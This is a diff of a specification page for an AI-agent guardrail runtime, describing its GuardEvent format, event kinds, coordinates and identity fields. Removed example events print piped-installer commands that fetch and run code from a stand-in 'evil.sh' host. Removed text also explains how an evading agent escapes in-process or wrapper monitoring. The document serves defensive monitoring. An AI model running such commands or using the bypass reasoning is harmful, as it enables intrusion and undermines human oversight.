@@ -1,111 +1,129 @@
 # GuardEvent
 
-A `GuardEvent` is the unit an interception point submits to the runtime. It is
-the OGR analogue of an OpenTelemetry span. Keywords per RFC 2119.
+A `GuardEvent` is the unit an integration point submits to the runtime.
+Keywords per RFC 2119.
 
 The MUST set is deliberately tiny: **`kind` + `payload`** is a complete,
-conformant event. Everything else refines attribution or correlation, and the
+conformant event. Everything else refines attribution or coordinates, and the
 runtime has a defined fallback for each absence. The minimal integration is an
 API key and two fields.
 
-## Fields
+## Kinds
 
-| Field | Type | Req | Description |
-|---|---|---|---|
-| `kind` | enum | MUST | See **Kinds** below. |
-| `payload` | object | MUST | Kind-specific body. |
-| `ogr_version` | string | MAY | Spec version, e.g. `"0.6"`. Absent = the current version. |
-| `guard_id` | string | MAY | Correlation HINT: stable across observation points for one logical action, sent only by deployments that actually propagate it ([guard-context](provenance-and-context.md#guard-context-propagation)). Absent, the runtime assigns one and correlates altitudes itself ([below](#identifiers-are-born-at-the-runtime)). |
-| `session_id` | string | SHOULD | Conversation / agent-run id. Enables stateful, multi-turn detection. Absent, the runtime derives sessions itself. |
-| `timestamp` | string | SHOULD | RFC 3339 / ISO 8601 UTC — when the unit was OBSERVED. Absent = the runtime's receive time; only buffered/replayed events need it explicitly. |
-| `observation_point` | enum | SHOULD | `conversation` \| `invocation` \| `execution`. The altitude — *what* was seen. Absent, the runtime defaults it from `kind`: `llm_request`/`llm_response`/`user_input`/`model_output` → `conversation`, `tool_call`/`tool_result`/`agent_spawn` → `invocation`, `exec`/`network`/`file` → `execution`. Assert it explicitly whenever the default is wrong for your vantage point (a gateway seeing `tool_call` still observes at `conversation`). |
-| `agent_id` | string | SHOULD | The acting agent, unique within the organization. Absent, derived from the API key ([identity floor](#the-api-key-is-the-identity-floor)). |
-| `agent_type` | string | SHOULD | What kind of agent (`hermes`, `openclaw`, `smartwork`). A label, not an identity — see the [shadow-agent rule](#one-agent_id-one-agent). |
-| `agent_workspace` | string | MAY | The named group of AGENTS this one belongs to. Absent, the API key's workspace. |
-| `agent_owner` | string | MAY | The agent's builder / responsible party. An attribute, never a policy boundary. |
-| `agent_user` | string | MAY | Who is using the agent THIS session. Absent, every session is one user. |
-| `sandbox_id` | string | MAY | Sandbox the action runs in. |
-| `parent_agent_id` | string | MAY | The agent that spawned this one; SHOULD be set by adapters that observe spawn. |
-| `delegation_chain` | array | MAY | Agent ids root-first; MAY be maintained by the runtime from `agent_spawn` events instead. |
-| `attestation` | enum | MAY | How the PEP verified the identity fields — a level from the [attestation ladder](attestation.md); clamped to the channel ceiling. |
-| `sensor_id` | string | SHOULD | *Which* integration observed this, e.g. `openguardrails-ebpf`. See [the sensor axis](#the-sensor-axis). |
-| `sensor_type` | enum | SHOULD | How evadable the observer is, weakest first: `in_process` \| `wrapper` \| `proxy` \| `kernel`. Absent, consumers MUST treat the sensor as bypassable. |
-| `sensor_version` | string | MAY | Sensor build, for triaging a bad rollout. |
-| `provenance` | array | SHOULD | Trust/taint of the inputs that produced this action. See [Provenance](provenance-and-context.md). |
-| `llm_protocol` | enum \| null | MAY | `openai.chat` \| `openai.responses` \| `anthropic.messages` \| `null`. Set by adapters observing at the `conversation` altitude. |
-| `content_encoding` | enum | MAY | `raw` (default) \| `redacted` \| `hashed` \| `metadata_only` — how the payload content was transformed before emission. See [Local redaction](local-redaction.md). |
-| `redactions` | array | MAY | Spans the adapter transformed locally before emission (metadata only, never originals). MUST be populated when `content_encoding` is `redacted`. See [Local redaction](local-redaction.md). |
+An agent's loop runs in [steps](overview.md#the-model) — one model call each.
+An event is one HALF of a step, observed at the moment the integration can
+still refuse it, plus one lifecycle mark:
 
-All fields are FLAT, top-level, snake_case — the identity fields are scalars,
-so there is no `subject`/`sensor` envelope to unwrap (the `agent_` / `sensor_`
-prefixes are the namespace). Objects are reserved for inherently structured
-data: `payload`, `provenance`, `redactions`.
+| `kind` | Emitted | `payload` |
+|---|---|---|
+| `step/request` | BEFORE the model call — holding what is about to be sent | the untouched provider request body (with `llm_protocol` as a hint), or the [canonical shape](#canonical-payloads) |
+| `step/response` | AFTER the model answers, BEFORE the agent acts on it | the untouched provider response body, or the canonical shape |
+| `turn/end` | when a loop-owning integration closes a turn | `{ "reason": "completed" \| "max_tokens" \| "blocked" \| "aborted" \| "error", "error"?: "..." }` |
 
-There is **no `event_id` on the request**. Identifiers are the runtime's job:
+Design rules the vocabulary enforces:
 
-### Identifiers are born at the runtime
+- **One event is one step half — never less.** A step's prose, its reasoning
+  and ALL of its tool calls are one `step/response`; the fed-back tool
+  results and the user's new words are one `step/request`. There is no kind
+  left to shatter a step into fragments, because splitting a generation
+  destroys the semantics a judge needs most: that the prose and the actions
+  came from the same prompt.
+- **Tool results are judged in the next request.** A call's result travels in
+  the following `step/request` (that is where the wire puts it); the runtime
+  pairs it with its call by the provider's tool-call id. No third content
+  kind exists.
+- **`turn/start` deliberately does not exist.** It is derivable — the first
+  `step/request` at a new turn number. `turn/end` is not derivable
+  (quiescence is invisible until declared or timed out), which is why it is
+  the one lifecycle mark in the vocabulary. Only loop-owning integrations can
+  send it; a runtime closes undeclared turns by idle timeout.
 
-The runtime MUST assign every accepted event a unique, time-ordered
-**`event_id`** at ingress and return it to the caller — on the
-[`Verdict`](verdict.md) for `/v1/evaluate`, in the per-element `results` row
-for `/v1/ingest` (order preserved). A client that wants to reference or query
-an event uses the returned id; it never mints one. Client-minted ids existed
-to make ingest retries deduplicable — a transport concern that does not
-belong in the data model. There is **no request deduplication**: a client
-that retries a timed-out call MAY produce a duplicate record, which
-observability data tolerates. A deployment that needs exactly-once delivery
-is the use case for a future optional idempotency HTTP header, not for an
-event field.
+**Forward the raw body.** An integration that holds a provider
+request/response does not decompose anything — it sends the body it holds.
+The RUNTIME normalizes: the new user words, the tool outcomes being fed back,
+the model's prose, its reasoning, every tool call it asks for, and the
+declared tool inventory (whose *definitions* are themselves an attack
+surface — description injection, rug-pulls — judged from the `tools` array
+where they already travel). `llm_protocol` (`openai.chat` |
+`openai.responses` | `anthropic.messages`) is a hint; a runtime SHOULD also
+detect the protocol from the body shape.
 
-**`guard_id`** follows the same rule with one addition: a PEP that really
-carries a guard-context across altitudes MAY send its own value, and the
-runtime MUST honor it. Absent, the runtime assigns `guard_id = event_id` and
-SHOULD correlate altitudes server-side: two events from the same agent,
-within a short window, whose payloads project to the same
-[canonical digest](enrollment-and-receipts.md#payload-canonicalization)
-(`tool_call {name, arguments}` ↔ `exec {argv, cwd}`, the same projections
-approval receipts bind) are one logical action and SHOULD share a guard
-group. Server-side correlation is the baseline precisely because the
-propagation token rides through the process OGR distrusts — an evading agent
-simply drops it, so a correlation that only works when the agent cooperates
-is not a correlation, it is a courtesy. A kernel-altitude event that matches
-NO invocation sibling under either mechanism is itself a signal: the agent
-ran something it never declared.
+### Canonical payloads
 
-### The agent identity fields
+An integration that does not hold a provider body (a harness with its own
+message format) sends the canonical shape directly:
 
-OGR is agent-centric: five flat fields answer up to five questions about the
-actor — WHICH agent (`agent_id`), WHAT kind of agent (`agent_type`), in
-WHICH workspace it runs (`agent_workspace`), WHO is responsible for it
-(`agent_owner`), and WHO is using it right now (`agent_user`). The first
-three place the event; the last two describe it. `parent_agent_id` and
-`delegation_chain` add **actor lineage** for multi-agent systems (an agent
-that spawns sub-agents) — distinct from the **data lineage**
-[provenance](provenance-and-context.md) carries. Per-event identities look
-legitimate in isolation; only the delegation path exposes an inherited
-privilege or a confused deputy (a low-privilege agent relaying instructions
-to a high-privilege one).
+```jsonc
+// step/request
+{ "messages": [ /* the full conversation being sent */ ],
+  "tools":    [ /* declared tool schemas — include when changed or first seen */ ] }
+
+// step/response
+{ "text": "...", "reasoning": "...",
+  "tool_calls": [ { "id": "call_abc", "name": "bash", "arguments": { ... } } ],
+  "model": "...",
+  "usage":  { "input_tokens": 0, "cache_read_tokens": 0, "cache_write_tokens": 0,
+              "output_tokens": 0, "reasoning_tokens": 0 },
+  "timing": { "started_at": "...", "first_token_at": "...", "completed_at": "..." } }
+```
+
+`usage` and `timing` are optional and worth sending: both vantage points have
+them for free (the response body carries usage; the integration observes
+time-to-first-token itself), and they power per-step cost and latency
+analytics downstream.
+
+The wire is deliberately STATELESS and repetitive — every `step/request`
+carries the full conversation, exactly as the provider protocol does. A
+runtime is expected to deduplicate at ingress (each message stored once, per
+session); the network cost is accepted in exchange for an integration that
+needs no state and no session affinity.
+
+## Coordinates
+
+| Field | Req | Description |
+|---|---|---|
+| `session_id` | SHOULD (loop-owning) | The producer's session. Absent, the runtime derives sessions itself and echoes the result on the Verdict. |
+| `turn` | MAY | 1-based turn index within the session. |
+| `step` | MAY | 1-based step index within the turn. |
+| `step_id` | MAY | Producer-minted opaque id binding the two events of ONE model call. A gateway mints one per proxied call; a producer stamping `turn`+`step` MAY omit it. |
+| `parent_session_id` | MAY | The spawning session, when this agent is a subagent. Each child reports its OWN session; the tree is the delegation record. |
+
+**Declared beats derived.** An integration that owns its loop stamps the
+trio on every event — that is the whole difference between the two
+[integration points](overview.md#two-integration-points). A gateway stamps
+nothing and the runtime reconstructs: sessions by conversation-prefix
+chaining, turns by instruction boundaries, steps by arrival. The verdict's
+`attribution` field says which happened. A runtime MUST honor a declared
+trio and MUST NOT re-derive over it.
+
+Known limitation of derivation, stated so nobody rediscovers it: a harness
+that COMPACTS its context breaks the prefix-append assumption (request N+1
+is no longer request N plus new messages), so a derived session splits at
+the compaction point. Declaring `session_id` avoids this entirely.
+
+## Identity
+
+| Field | Req | Description |
+|---|---|---|
+| `agent_id` | SHOULD | The acting agent, unique within the organization. Absent, derived from the API key ([identity floor](#the-api-key-is-the-identity-floor)). |
+| `agent_type` | SHOULD | What kind of agent (`hermes`, `openclaw`, `claude-code`, or the deployment's own product name). A label, not an identity — see [one `agent_id`, one agent](#one-agent_id-one-agent). Self-declared on the agent-direct path; a runtime MAY infer it (e.g. from the system prompt) on the gateway path. |
+| `agent_workspace` | MAY | The named group of AGENTS this one belongs to. Absent, the API key's workspace. |
+| `agent_owner` | MAY | The agent's builder / responsible party. An attribute, never a policy boundary. |
+| `agent_user` | MAY | Who is using the agent THIS session. Absent, every session is one user. |
 
 Behind a gateway that authenticates its callers with per-caller credentials,
-the authenticated caller id is the natural `agent_id`; `agent_type` accepts
-the harness name or the deployment's own product name; `agent_workspace` is
+the authenticated caller id is the natural `agent_id`; `agent_workspace` is
 an agent grouping the operator maintains (e.g. a consumer-group header) —
 never a human org chart, never a tenant.
 
-```json
-{ "agent_id": "smartwork-prod", "agent_type": "smartwork",
-  "agent_workspace": "growth-agents", "agent_owner": "user:tom",
-  "agent_user": "user:lily", "attestation": "gateway_api_key" }
-```
-
 ### The API key is the identity floor
 
-The five-tuple degrades gracefully. The minimum conformant integration sends
-only the organization API key and no identity fields at all: the runtime MUST then
-derive `agent_id` from the key (one key, one default agent), place the agent
-in the key's workspace, and treat every session as the same single user.
-Each field a PEP can assert refines that picture; none is a precondition for
-coverage.
+The identity fields degrade gracefully. The minimum conformant integration
+sends only the organization API key and no identity fields at all: the
+runtime MUST then derive `agent_id` from the key (one key, one default
+agent), place the agent in the key's workspace, and treat every session as
+the same single user. Each field an integration can assert refines that
+picture; none is a precondition for coverage.
 
 ### One `agent_id`, one agent
 
@@ -127,141 +145,84 @@ a runtime MUST NOT let either select configuration.
 
 ⚠️ **Every identity field is a CLAIM**, bounded by the channel: resolved only
 within the tenant the channel credential proves (`agent_workspace` names a
-workspace inside that tenant, never the tenant itself), clamped to the
-channel's attestation ceiling, and — where the PEP is enrolled — bounded by
-its [assertion scope](enrollment-and-receipts.md#enrollment).
+workspace inside that tenant, never the tenant itself).
 
-### The sensor axis
+## Remaining fields
 
-The `agent_*` fields say who **acted**; `sensor_id` / `sensor_type` say who
-**observed**. It is the mechanism axis that
-[`observation_point`](overview.md#three-observation-altitudes) deliberately
-excludes: an eBPF probe and a framework's own sandbox wrapper both assert
-`execution`, but only one of them survives an agent that simply declines to
-call it.
-
-`sensor_type` is a closed, ORDERED vocabulary — weakest first, and a missing
-value MUST be read as bypassable:
-
-| `sensor_type` | Runs | Bypassed by |
+| Field | Req | Description |
 |---|---|---|
-| `in_process` | inside the agent process (framework hook) | the agent's own code path not reaching it |
-| `wrapper` | an out-of-process wrapper the agent should go through (sandboxed exec, shell shim) | not going through it |
-| `proxy` | a network intermediary (LLM gateway) | talking to a different endpoint |
-| `kernel` | kernel / syscall level (eBPF, seccomp) | — not bypassable from userspace |
+| `ogr_version` | MAY | Spec version, e.g. `"0.7"`. Absent = the current version. |
+| `timestamp` | SHOULD | RFC 3339 / ISO 8601 UTC — when the unit was OBSERVED. Absent = the runtime's receive time; only buffered/replayed events need it explicitly. |
+| `integration` | SHOULD | The reporting integration and build, e.g. `"ogr-higress/0.4.1"`, `"dsh-plugin/0.1.0"`. For heartbeats, fleet coverage, and triaging a bad rollout. |
+| `llm_protocol` | MAY | Which provider protocol a raw payload body speaks. |
+
+All fields are FLAT, top-level, snake_case; objects are reserved for
+inherently structured data (`payload`).
+
+There is **no `event_id` on the request**. Identifiers are the runtime's job:
+
+### Identifiers are born at the runtime
+
+The runtime MUST assign every accepted event a unique, time-ordered
+**`event_id`** at ingress and return it to the caller — on the
+[`Verdict`](verdict.md) for `/v1/evaluate`, in the per-element `results` row
+for `/v1/ingest` (order preserved). A client that wants to reference or query
+an event uses the returned id; it never mints one. There is **no request
+deduplication**: a client that retries a timed-out call MAY produce a
+duplicate record, which observability data tolerates.
+
+## Example — gateway path (raw body, nothing declared)
 
 ```json
-{ "sensor_id": "openguardrails-ebpf", "sensor_type": "kernel", "sensor_version": "0.3.1" }
-```
-
-The pairing is what makes coverage readable. An `execution` event from a
-`kernel` sensor with no matching `invocation` event is an agent that ran
-something without ever declaring it — a bypass. The same pair from a `wrapper`
-sensor is much weaker evidence, because the wrapper is exactly the thing an
-evading agent skips. A runtime SHOULD keep the sensor with the event and
-SHOULD NOT collapse it into the altitude.
-
-## Kinds
-
-There are two ways into the runtime, and the kind vocabulary reflects them.
-
-**The developer path: forward the raw LLM traffic.** An application that
-holds a chat-completion request does not decompose anything — it sends the
-body it was about to give the model, and the body the model returned, and
-acts on the verdicts:
-
-| `kind` | Emitted when | `payload` |
-|---|---|---|
-| `llm_request` | BEFORE the request goes to the model | the untouched provider request body (`messages`, `tools`, ...) in the protocol named by `llm_protocol` |
-| `llm_response` | AFTER the model answers, BEFORE the agent acts on it | the untouched provider response body |
-
-The RUNTIME derives the classification from the raw body: the new user
-words, the tool outcomes being fed back, the model's prose and every tool
-call it asks for, and the declared tool inventory (whose *definitions* are
-themselves an attack surface — description injection, rug-pulls — and are
-judged from the `tools` array where they already travel). Classifying the
-conversation was every PEP's private burden through v0.5; the reference
-gateway alone carried ~800 lines of it. It is the runtime's job.
-`llm_protocol` (`openai.chat` | `anthropic.messages` | ...) is a hint; a
-runtime SHOULD also detect the protocol from the body shape.
-
-**The sensor path: declare what the LLM wire cannot show.** These kinds
-exist because their facts never appear in any model request — a kernel
-probe holds an `execve`, not a messages array:
-
-| `kind` | Emitted when | `payload` shape (informative) |
-|---|---|---|
-| `tool_call` | an agent hook holds an invocation, pre-dispatch | `{ "name": "shell.exec", "arguments": {...} }` |
-| `tool_result` | a tool returns, pre-feedback | `{ "name": "...", "result": "..." }` |
-| `exec` | the execution altitude runs a process | `{ "argv": [...], "cwd": "...", "env_keys": [...] }` |
-| `network` | the execution altitude opens a connection | `{ "host": "...", "port": 443, "direction": "egress" }` |
-| `file` | the execution altitude reads/writes a path | `{ "op": "write", "path": "..." }` |
-| `agent_spawn` | an agent creates/delegates to a sub-agent | `{ "child_agent_id": "...", "child_agent_type": "...", "granted_scopes": [...] }` |
-| `user_input` / `model_output` | a simple integration reports one side of a turn directly | `{ "text": "..." }` / `{ "text": "...", "tool_calls": [...] }` |
-
-A detector MAY declare which kinds it handles, and MAY declare which
-`content_encoding` values it can meaningfully judge; one that receives an
-encoding it did not declare MUST abstain (`allow` with a reason) rather
-than judge blind (see
-[detector encoding capability](local-redaction.md#detector-encoding-capability)).
-
-**Removed in v0.6**: `tool_register`, `mcp_connect`, `skill_load` (their
-facts ride the `tools` array and the system prompt of `llm_request`, where
-the runtime classifies them — no integration ever emitted the standalone
-kinds) and `config_change` (never emitted; an agent's config edits surface
-as `file`/`exec` at the execution altitude). `agent_spawn` stays: delegation
-is a guarded action and the source a runtime builds `delegation_chain` from.
-
-## Example — the developer path
-
-```json
-{ "kind": "llm_request", "llm_protocol": "openai.chat",
+{ "kind": "step/request", "llm_protocol": "openai.chat",
+  "step_id": "hg-7f3a",
+  "integration": "ogr-higress/0.4.1",
+  "agent_id": "consumer-alice",
   "payload": { "model": "gpt-5", "messages": [ ... ], "tools": [ ... ] } }
 ```
 
+The runtime derives session/turn/step and echoes them on the verdict with
+`"attribution": "derived"`.
+
+## Example — agent-direct path (canonical shape, coordinates declared)
+
 ```json
-{ "kind": "llm_response", "llm_protocol": "openai.chat",
-  "payload": { "choices": [ { "message": { "content": "...", "tool_calls": [ ... ] } } ] } }
+{
+  "ogr_version": "0.7",
+  "kind": "step/response",
+  "session_id": "sess-01H9",
+  "turn": 3,
+  "step": 2,
+  "agent_id": "build-agent-3",
+  "agent_type": "my-harness",
+  "integration": "my-harness-ogr/1.0.0",
+  "payload": {
+    "text": "Cloning the repo now.",
+    "tool_calls": [
+      { "id": "call_1", "name": "bash",
+        "arguments": { "command": "git clone https://github.com/acme/app" } }
+    ],
+    "usage": { "input_tokens": 8120, "output_tokens": 64 },
+    "timing": { "started_at": "2026-08-14T09:30:01Z",
+                "first_token_at": "2026-08-14T09:30:01.4Z",
+                "completed_at": "2026-08-14T09:30:02.1Z" }
+  }
+}
 ```
 
-Forward the request, act on the verdict; forward the response, act on the
-verdict. Nothing is decomposed client-side.
+```json
+{ "kind": "turn/end", "session_id": "sess-01H9", "turn": 3,
+  "payload": { "reason": "completed" } }
+```
 
 ## Example — minimal conformant event
 
 ```json
-{ "kind": "exec", "payload": { "argv": ["curl", "-fsSL", "https://evil.sh"] } }
+{ "kind": "step/request", "payload": { "messages": [ { "role": "user", "content": "hi" } ] } }
 ```
 
 The runtime supplies everything else: `event_id` (returned on the verdict),
-`guard_id` (= `event_id`), timestamp (receive time), the agent (derived from
-the API key), the session (derived), the workspace (the key's).
-
-## Example — execution-altitude `exec` of a piped installer, fully attributed
-
-```json
-{
-  "ogr_version": "0.6",
-  "guard_id": "ga-1a2b",
-  "session_id": "run-55",
-  "timestamp": "2026-06-27T16:40:00Z",
-  "observation_point": "execution",
-  "kind": "exec",
-  "agent_id": "hermes-1",
-  "agent_type": "hermes",
-  "agent_user": "user:tom",
-  "sandbox_id": "sbx-7",
-  "sensor_id": "openguardrails-ebpf",
-  "sensor_type": "kernel",
-  "payload": { "argv": ["bash", "-c", "curl https://get.evil.sh | bash"], "cwd": "/workspace", "env_keys": ["PATH", "AWS_SECRET_ACCESS_KEY"] },
-  "provenance": [
-    { "source": "web", "trust": "untrusted", "ref": "evt-7c1", "taint_tags": ["external_content", "executable_intent"] }
-  ]
-}
-```
-
-`guard_id` here is a propagated guard-context (the agent hook that declared
-this action minted it); `provenance[].ref` points at a runtime-returned
-`event_id` the adapter captured earlier.
+timestamp (receive time), the agent (derived from the API key), the session,
+turn and step (derived), the workspace (the key's).
 
 The normative JSON Schema is [`schema/guard-event.schema.json`](../schema/guard-event.schema.json).
